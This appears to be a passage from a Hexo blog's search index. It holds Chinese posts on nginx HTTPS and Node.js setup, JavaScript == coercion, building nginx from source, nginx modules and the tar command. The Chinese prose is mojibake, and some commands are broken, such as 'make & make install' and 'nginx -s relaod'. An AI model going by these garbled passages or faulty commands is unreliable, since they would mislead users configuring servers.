/etc/ssl/kekek.cc/chained.pem;   // å…¬é’¥</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span>    /etc/ssl/kekek.cc/domain.key;// ç§é’¥</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>    <span class="number">1d</span>;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span>      shared:SSL:<span class="number">50m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_tickets</span>    <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Node-jsé…ç½®"><a href="#Node-jsé…ç½®" class="headerlink" title="Node.jsé…ç½®"></a>Node.jsé…ç½®</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(app);</span><br><span class="line"><span class="keyword">var</span> httpsServer = https.<span class="title function_">createServer</span>(&#123;</span><br><span class="line">    <span class="attr">key</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/ssl/kekek.cc/domain.key&#x27;</span>),</span><br><span class="line">    <span class="attr">cert</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/ssl/kekek.cc/chained.pem&#x27;</span>)</span><br><span class="line">&#125;, app);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, onError);</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, onListening);</span><br><span class="line"></span><br><span class="line">httpsServer.<span class="title function_">listen</span>(<span class="number">443</span>);</span><br><span class="line">httpsServer.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, onError);</span><br><span class="line">httpsServer.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, onListening);</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://book.douban.com/subject/25863515/">å›¾è§£HTTP ç¬¬ä¸ƒç« </a></li><li><a href="https://zhuanlan.zhihu.com/p/22142170">æ·±å…¥æ­ç§˜HTTPSå®‰å…¨é—®é¢˜&amp;è¿æ¥å»ºç«‹å…¨è¿‡ç¨‹</a></li><li><a href="https://blog.csdn.net/sean_cd/article/details/6966130">HTTPSå·¥ä½œåŸç†</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript==ä¸­çš„ç±»å‹è½¬æ¢</title>
      <link href="/post/javascript-equals.html"/>
      <url>/post/javascript-equals.html</url>
      
        <content type="html"><![CDATA[<h3 id="JavaScript-ç±»å‹è½¬æ¢è§„åˆ™"><a href="#JavaScript-ç±»å‹è½¬æ¢è§„åˆ™" class="headerlink" title="JavaScript &#x3D;&#x3D; ç±»å‹è½¬æ¢è§„åˆ™"></a>JavaScript &#x3D;&#x3D; ç±»å‹è½¬æ¢è§„åˆ™</h3><p>å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ç±»å‹ä¸åŒï¼Œâ€œ&#x3D;&#x3D;â€ç›¸ç­‰æ“ä½œç¬¦ä¹Ÿå¯èƒ½ä¼šè®¤ä¸ºå®ƒä»¬ç›¸ç­‰ã€‚æ£€æµ‹ç›¸ç­‰å°†ä¼šéµå®ˆå¦‚ä¸‹è§„åˆ™å’Œç±»å‹è½¬æ¢:</p><ul><li>å¦‚æœä¸€ä¸ªå€¼æ˜¯ null ï¼Œå¦ä¸€ä¸ªæ˜¯ undefined ï¼Œåˆ™å®ƒä»¬ç›¸ç­‰ã€‚</li><li>å¦‚æœä¸€ä¸ªå€¼æ˜¯æ•°å­—ï¼Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼Œå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œç„¶åä½¿ç”¨è½¬æ¢åçš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚</li><li>å¦‚æœå…¶ä¸­ä¸€ä¸ªå€¼æ˜¯ true ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸º 1 å†è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªå€¼æ˜¯ false ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸º 0 å†è¿›è¡Œæ¯”è¾ƒã€‚</li><li>å¦‚æœä¸€ä¸ªå€¼æ˜¯å¯¹è±¡ï¼Œå¦ä¸€ä¸ªå€¼æ˜¯æ•°å­—æˆ–å­—ç¬¦ä¸²ï¼Œåˆ™ä½¿ç”¨ 3.8.3 èŠ‚æ‰€æåˆ°çš„è½¬æ¢è§„åˆ™å°†å¯¹è±¡è½¬æ¢ä¸ºåŸå§‹å€¼ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚å¯¹è±¡é€šè¿‡ toString() æ–¹æ³•æˆ–è€… valueOf() æ–¹æ³•è½¬æ¢ä¸ºåŸå§‹å€¼ã€‚ JavaScript è¯­è¨€æ ¸å¿ƒçš„å†…ç½®ç±»é¦–å…ˆå°è¯•ä½¿ç”¨ valueOf() ï¼Œå†å°è¯•ä½¿ç”¨ toString() ï¼Œé™¤äº†æ—¥æœŸç±»ï¼Œæ—¥æœŸç±»åªä½¿ç”¨ toString() è½¬æ¢ã€‚é‚£äº›ä¸æ˜¯ JavaScript è¯­è¨€æ ¸å¿ƒä¸­çš„å¯¹è±¡åˆ™é€šè¿‡å„è‡ªçš„å®ç°ä¸­å®šä¹‰çš„æ–¹æ³•è½¬æ¢ä¸ºåŸå§‹å€¼ã€‚</li><li>å…¶ä»–ä¸åŒç±»å‹ä¹‹é—´çš„æ¯”è¾ƒå‡ä¸ç›¸ç­‰ã€‚</li></ul><p>å‚è€ƒï¼šã€ŠJavascriptæƒå¨æŒ‡å—ã€‹4.9.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…nginx</title>
      <link href="/post/install-nginx.html"/>
      <url>/post/install-nginx.html</url>
      
        <content type="html"><![CDATA[<h2 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h2><h3 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h3><p>å»<a href="http://nginx.org/en/download.html">download</a>é¡µé¢é€‰ç€åˆé€‚çš„ç‰ˆæœ¬ï¼Œä¸‹è½½æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.11.3.tar.gz</span><br><span class="line">tar -zxvf nginx-1.11.3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><ol><li><p>configure</p><p> ç¼–è¯‘çš„æ—¶å€™å¯ä»¥æŒ‡å®šä¸€äº›å‚æ•°ã€‚nginxå®‰è£…ç›®å½•ã€é…ç½®æ–‡ä»¶è·¯å¾„ã€æ’ä»¶ç­‰ç­‰ã€‚<br> nginxå¤§éƒ¨åˆ†å¸¸ç”¨æ¨¡å—ï¼Œç¼–è¯‘æ—¶<code>./configure --help</code>ä»¥<code>--without</code>å¼€å¤´çš„éƒ½é»˜è®¤å®‰è£…ã€‚<br> <code>--prefix=PATH</code>: æŒ‡å®šnginxçš„å®‰è£…ç›®å½•ã€‚é»˜è®¤ <code>/usr/local/nginx</code><br> <code>--conf-path=PATH</code>: è®¾ç½®nginx.confé…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚nginxå…è®¸ä½¿ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶å¯åŠ¨ï¼Œé€šè¿‡å‘½ä»¤è¡Œä¸­çš„-cé€‰é¡¹ã€‚é»˜è®¤ä¸ºprefix&#x2F;conf&#x2F;nginx.conf<br> <code>--user=name</code>: è®¾ç½®nginxå·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·ã€‚å®‰è£…å®Œæˆåï¼Œå¯ä»¥éšæ—¶åœ¨nginx.confé…ç½®æ–‡ä»¶æ›´æ”¹useræŒ‡ä»¤ã€‚é»˜è®¤çš„ç”¨æˆ·åæ˜¯nobodyã€‚â€“group&#x3D;nameç±»ä¼¼<br> <code>--with-pcre</code>: è®¾ç½®PCREåº“çš„æºç è·¯å¾„ï¼Œå¦‚æœå·²é€šè¿‡yumæ–¹å¼å®‰è£…ï¼Œä½¿ç”¨â€“with-pcreè‡ªåŠ¨æ‰¾åˆ°åº“æ–‡ä»¶ã€‚ä½¿ç”¨â€“with-pcre&#x3D;PATHæ—¶ï¼Œéœ€è¦ä»PCREç½‘ç«™ä¸‹è½½pcreåº“çš„æºç ï¼ˆç‰ˆæœ¬4.4 - 8.30ï¼‰å¹¶è§£å‹ï¼Œå‰©ä¸‹çš„å°±äº¤ç»™Nginxçš„.&#x2F;configureå’Œmakeæ¥å®Œæˆã€‚perlæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨åœ¨locationæŒ‡ä»¤å’Œ ngx_http_rewrite_moduleæ¨¡å—ä¸­<br> <code>--with-zlib=PATH</code>: æŒ‡å®š zlibï¼ˆç‰ˆæœ¬1.1.3 - 1.2.5ï¼‰çš„æºç è§£å‹ç›®å½•ã€‚åœ¨é»˜è®¤å°±å¯ç”¨çš„ç½‘ç»œä¼ è¾“å‹ç¼©æ¨¡å—ngx_http_gzip_moduleæ—¶éœ€è¦ä½¿ç”¨zlib<br> <code>--with-http_ssl_module</code>: ä½¿ç”¨httpsåè®®æ¨¡å—ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æ¨¡å—æ²¡æœ‰è¢«æ„å»ºã€‚å‰ææ˜¯opensslä¸openssl-develå·²å®‰è£…<br> <code>--with-http_stub_status_module</code>: ç”¨æ¥ç›‘æ§ Nginx çš„å½“å‰çŠ¶æ€<br> <code>--with-http_realip_module</code>: é€šè¿‡è¿™ä¸ªæ¨¡å—å…è®¸æˆ‘ä»¬æ”¹å˜å®¢æˆ·ç«¯è¯·æ±‚å¤´ä¸­å®¢æˆ·ç«¯IPåœ°å€å€¼(ä¾‹å¦‚X-Real-IP æˆ– X-Forwarded-For)ï¼Œæ„ä¹‰åœ¨äºèƒ½å¤Ÿä½¿å¾—åå°æœåŠ¡å™¨è®°å½•åŸå§‹å®¢æˆ·ç«¯çš„IPåœ°å€<br> <code>--add-module=PATH</code>: æ·»åŠ ç¬¬ä¸‰æ–¹å¤–éƒ¨æ¨¡å—ï¼Œå¦‚nginx_upstream_check_moduleæˆ–ç¼“å­˜æ¨¡å—ã€‚æ¯æ¬¡æ·»åŠ æ–°çš„æ¨¡å—éƒ½è¦é‡æ–°ç¼–è¯‘ï¼ˆTengineå¯ä»¥åœ¨æ–°åŠ å…¥moduleæ—¶æ— éœ€é‡æ–°ç¼–è¯‘ï¼‰<br> e.g,</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--user=nginx \</span><br><span class="line">--group=nginx \</span><br><span class="line">--add-module=./plugins/nginx_upstream_check_module/</span><br></pre></td></tr></table></figure></li><li><p>make</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure></li></ol><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li><p>å¯åŠ¨</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c filename <span class="comment"># é»˜è®¤ conf/nginx.conf</span></span><br></pre></td></tr></table></figure></li><li><p>åœæ­¢</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nginx -s stop </span><br><span class="line"></span><br><span class="line"><span class="comment"># å¹³æ»‘é€€å‡º</span></span><br><span class="line"><span class="built_in">kill</span> -QUIT `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼ºåˆ¶é€€å‡º</span></span><br><span class="line"><span class="built_in">kill</span> -TERM `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br></pre></td></tr></table></figure></li><li><p>å¹³æ»‘å‡çº§</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨æ–°è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">kill</span> -USR2 `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€æ­¥æ—§Serverçš„åœæ­¢å·¥ä½œè¿›ç¨‹</span></span><br><span class="line"><span class="built_in">kill</span> -WINCH `<span class="built_in">cat</span> /var/run/nginx.pid.oldbin`</span><br></pre></td></tr></table></figure></li><li><p>é‡æ–°åŠ è½½æ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx -s relaod </span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span> -HUP `<span class="built_in">cat</span> /var/run/nginx.pid`</span><br></pre></td></tr></table></figure></li><li><p>æ£€éªŒé…ç½®æ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t -c /usr/local/nginx/conf/nginx.conf </span><br></pre></td></tr></table></figure></li><li><p>æ—¥å¿—åˆ‡å‰²</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR1 `<span class="built_in">cat</span> /nginx/logs/nginx.pid`</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://segmentfault.com/a/1190000002797601">NginxæœåŠ¡å™¨å®‰è£…åŠé…ç½®æ–‡ä»¶è¯¦è§£</a></li><li><a href="http://nginx.org/en/docs/control.html">Controlling nginx</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginxå¸¸ç”¨æ¨¡å—</title>
      <link href="/post/nginx-modules.html"/>
      <url>/post/nginx-modules.html</url>
      
        <content type="html"><![CDATA[<h3 id="NGX-HTTP-AUTH-BASIC-MODULE"><a href="#NGX-HTTP-AUTH-BASIC-MODULE" class="headerlink" title="NGX_HTTP_AUTH_BASIC_MODULE"></a>NGX_HTTP_AUTH_BASIC_MODULE</h3><p>è¿™ä¸ªæ¨¡å—ç”¨æ¥åšBasic Authè®¤è¯çš„ï¼Œé»˜è®¤å°±å·²ç»å®‰è£…è¿‡äº†ã€‚</p><p>ç”Ÿæˆå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;username:$(openssl passwd -crypt password)\n&quot; &gt;&gt; conf/htpasswd</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name elk.kekek.cc;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">         auth_basic            &quot;elk.my-guide.cc&quot;;</span><br><span class="line">         auth_basic_user_file  htpasswd;</span><br><span class="line">         proxy_pass            http://elk.my-guide.cc:5601;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœ<code>auth_basic_user_file</code>ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥æŒ‡å®šï¼Œé‚£ä¹ˆå®ƒç›¸å¯¹çš„æ˜¯confæ–‡ä»¶ã€‚</p></blockquote><p>é‡æ–°åŠ è½½é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="NGX-HTTP-SUB-MODULE"><a href="#NGX-HTTP-SUB-MODULE" class="headerlink" title="NGX_HTTP_SUB_MODULE"></a>NGX_HTTP_SUB_MODULE</h3><p>è¿™ä¸ªæ¨¡å—å¯ä»¥è®©æˆ‘ä»¬æ¥ä¿®æ”¹ç½‘ç«™å“åº”å†…å®¹ä¸­ã€‚</p><p>é»˜è®¤è¿™ä¸ªæ¨¡å—æ˜¯æ²¡ç¼–è¯‘åˆ°Nginxä¸­çš„ï¼Œåœ¨é…ç½®çš„æ—¶å€™æˆ‘ä»¬åŠ ä¸Š<code>--with-http_sub_module</code>å°±å¯ä»¥äº†ã€‚</p><p>å®ƒä¸»è¦æœ‰ä¸‰ä¸ªæŒ‡ä»¤</p><ul><li>sub_filter  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># è¿™é‡Œä¼šå°†ç½‘é¡µé‡Œçš„`dog`æ›¿æ¢æˆ`pig`</span><br><span class="line">sub_filter dog pig;</span><br><span class="line"></span><br><span class="line"># åœ¨å¤´éƒ¨å¼•å…¥ä¸€æ®µjsã€‚æ³¨æ„ï¼Œæˆ‘ä»¬åªèƒ½ä½¿ç”¨ä¸€æ¬¡sub_filterï¼Œå¦‚æœæœ‰å¤šä¸ªåœ°æ–¹æˆ–è€…æ›´å¤æ‚çš„æ›¿æ¢ä½¿ç”¨ä¸‹é¢çš„`NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE`æ¨¡å—</span><br><span class="line">sub_filter &lt;/head&gt; &#x27;&lt;/head&gt;&lt;script language=&quot;javascript&quot; src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&#x27;;</span><br></pre></td></tr></table></figure></li><li>sub_filter_types  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŒ‡å®šéœ€è¦è¢«æ›¿æ¢çš„MIMEç±»å‹,é»˜è®¤ä¸º&#x27;text/html&#x27;ï¼Œå¦‚æœåˆ¶å®šä¸º*ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„</span><br><span class="line">sub_filter_types text/javascript text/css;</span><br></pre></td></tr></table></figure></li><li>sub_filter_once  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸²æ›¿æ¢ä¸€æ¬¡è¿˜æ˜¯å¤šæ¬¡æ›¿æ¢ï¼Œé»˜è®¤æ›¿æ¢ä¸€ä¸ªã€‚å¦‚æœç½‘é¡µä¸­æœ‰å¤šä¸ª`dog`å­—ç¬¦ä¸²ï¼Œå¦‚æœå¼€å¯onceåªä¼šæ›¿æ¢ç¬¬ä¸€ä¸ªã€‚</span><br><span class="line">sub_filter_once on;</span><br></pre></td></tr></table></figure></li></ul><h3 id="NGX-HTTP-SUBSTITUTIONS-FILTER-MODULE"><a href="#NGX-HTTP-SUBSTITUTIONS-FILTER-MODULE" class="headerlink" title="NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE"></a>NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE</h3><p><a href="https://github.com/yaoweibin/ngx_http_substitutions_filter_module">NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE</a>å’ŒNGX_HTTP_SUB_MODULEç±»ä¼¼ï¼Œä¸è¿‡åŠŸèƒ½æ›´å¼ºå¤§ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™å»åŒ¹é…ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œç¼–è¯‘æ—¶éœ€è¦åŠ ä¸Š<code>--add-module=/path/to/ngx_http_substitutions_filter_module</code>ã€‚</p><p>å®ƒä¸»ç”¨ä¸¤ä¸ªæŒ‡ä»¤</p><ul><li><p>subs_filter</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># æ›¿æ¢`&lt;script src=&quot;jquery.min.js?v=3.2.1&quot;&gt;&lt;/script&gt;`çš„ç‰ˆæœ¬ä¸ºURLä¸Švå‚æ•°å€¼ã€‚</span><br><span class="line"># ä¾‹å¦‚ï¼šæˆ‘ä»¬è¯·æ±‚`index.html?v=2.2.2`ï¼Œå¤„ç†åæˆ‘ä»¬æ‹¿åˆ°çš„ç½‘é¡µå†…å®¹å°±æ˜¯`&lt;script src=&quot;jquery.min.js?v=2.2.2&quot;&gt;&lt;/script&gt;`ã€‚</span><br><span class="line"># $arg_vå–å‡ºqueryä¸Šçš„vçš„å€¼ã€‚$argä»£è¡¨queryï¼Œ$arg_&#123;x&#125;ä»£è¡¨queryä¸Š&#123;x&#125;çš„å€¼ã€‚</span><br><span class="line">subs_filter jquery\.min\.js\?v=\d\.\d\.\d jquery.min.js?v=$arg_v or;</span><br><span class="line"># subs_filter å¯ä»¥å†™å¤šä¸ª</span><br><span class="line">subs_filter dog pig;</span><br></pre></td></tr></table></figure><p>  subs_filter ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ›¿æ¢æ¨¡å¼ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©å­—ç¬¦ä¸²æ›¿æ¢æˆ–è€…æ­£åˆ™æ›¿æ¢</p><ul><li>g(default):æ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</li><li>i: æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é…ã€‚</li><li>o: åªéœ€å°†ç¬¬ä¸€ä¸ªã€‚</li><li>r:è¯¥æ¨¡å¼æ˜¯ä½œä¸ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œé»˜è®¤æ˜¯å›ºå®šçš„å­—ç¬¦ä¸²ã€‚</li></ul></li><li><p>subs_filter_types</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŒ‡å®šéœ€è¦è¢«æ›¿æ¢çš„MIMEç±»å‹,é»˜è®¤ä¸º&#x27;text/html&#x27;ï¼Œå¦‚æœåˆ¶å®šä¸º*ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„</span><br><span class="line">sub_filter_types text/javascript text/css;</span><br></pre></td></tr></table></figure></li></ul><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a href="http://rmingwang.com/install-nginx-third-modules-http_sub_module.html">Nginxç¼–è¯‘å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—http_substitutions_filter_module</a></p><h3 id="NGINX-HTTP-CONCAT"><a href="#NGINX-HTTP-CONCAT" class="headerlink" title="NGINX-HTTP-CONCAT"></a><a href="https://github.com/alibaba/nginx-http-concat">NGINX-HTTP-CONCAT</a></h3><p>ç”¨äº cssã€js åˆå¹¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/static/??foo.css,bar/foobaz.js</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;??foo1.css,foo2.css,subdir/foo3.css?v=2345&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;??bar1.js,bar22.css,subdir/bar3.js?v=3245&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="HTTP-IMAGE-FILTER-MODULE"><a href="#HTTP-IMAGE-FILTER-MODULE" class="headerlink" title="HTTP_IMAGE_FILTER_MODULE"></a>HTTP_IMAGE_FILTER_MODULE</h3><h3 id="NGINX-HTTP-FOOTER-FILTER"><a href="#NGINX-HTTP-FOOTER-FILTER" class="headerlink" title="NGINX-HTTP-FOOTER-FILTER"></a>NGINX-HTTP-FOOTER-FILTER</h3><p><a href="http://www.ttlsa.com/nginx/nginx-modules-nginx-http-footer-filter/">http://www.ttlsa.com/nginx/nginx-modules-nginx-http-footer-filter/</a></p><h3 id="LIMIT-UPLOAD-RATE"><a href="#LIMIT-UPLOAD-RATE" class="headerlink" title="LIMIT_UPLOAD_RATE"></a>LIMIT_UPLOAD_RATE</h3><p>é™åˆ¶å®¢æˆ·ç«¯ä¸Šä¼ é€Ÿç‡</p><h3 id="NGINX-HTTP-GEO-IP-MODULE"><a href="#NGINX-HTTP-GEO-IP-MODULE" class="headerlink" title="NGINX-HTTP-GEO-IP-MODULE"></a>NGINX-HTTP-GEO-IP-MODULE</h3><h3 id="NGX-DYNAMIC-UPSTREAM"><a href="#NGX-DYNAMIC-UPSTREAM" class="headerlink" title="NGX_DYNAMIC_UPSTREAM"></a>NGX_DYNAMIC_UPSTREAM</h3><p>Dynamic upstream for nginx</p><h3 id="HTTP-UPSTREAM-CONSISTENT-HASH-MODULE"><a href="#HTTP-UPSTREAM-CONSISTENT-HASH-MODULE" class="headerlink" title="HTTP_UPSTREAM_CONSISTENT_HASH_MODULE"></a>HTTP_UPSTREAM_CONSISTENT_HASH_MODULE</h3>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tar.md</title>
      <link href="/post/tar.html"/>
      <url>/post/tar.html</url>
      
        <content type="html"><![CDATA[<h3 id="tarå‘½ä»¤"><a href="#tarå‘½ä»¤" class="headerlink" title="tarå‘½ä»¤"></a>tarå‘½ä»¤</h3><p>tarå‘½ä»¤ç”¨æ¥å‹ç¼©å’Œè§£å‹æ–‡ä»¶ï¼Œå®ƒæœ¬èº«ä¸å…·æœ‰å‹ç¼©åŠŸèƒ½ï¼Œå®ƒæ˜¯è°ƒç”¨å‹ç¼©åŠŸèƒ½å®ç°çš„ã€‚</p><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><p>ä¸»é€‰é¡¹</p><ul><li>-c å»ºç«‹å‹ç¼©æ¡£æ¡ˆ</li><li>-x è§£å‹</li><li>-t æŸ¥çœ‹å†…å®¹</li><li>-r è¿½åŠ æ–‡ä»¶</li><li>-u æ›´æ–°å‹ç¼©åŒ…æ–‡ä»¶</li></ul><p>è¾…åŠ©é¡¹</p><ul><li>-z æœ‰gzipå±æ€§çš„</li><li>-j æœ‰bz2å±æ€§çš„</li><li>-Z æœ‰compresså±æ€§çš„</li><li>-v æ˜¾ç¤ºæ‰€æœ‰è¿‡ç¨‹</li><li>-O å°†æ–‡ä»¶è§£å¼€åˆ°æ ‡å‡†è¾“å‡º</li><li>-C åˆ‡æ¢åˆ°æŒ‡å®šç›®å½•</li><li>-f æŒ‡å®šå‹ç¼©æ–‡ä»¶<blockquote><p>å‚æ•°-fæ˜¯å¿…é¡»çš„<br>-f: ä½¿ç”¨æ¡£æ¡ˆåå­—ï¼Œåˆ‡è®°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯æœ€åä¸€ä¸ªå‚æ•°ï¼Œåé¢åªèƒ½æ¥æ¡£æ¡ˆåã€‚</p></blockquote></li></ul><h4 id="å¸¸ç”¨å‘½ä»¤"><a 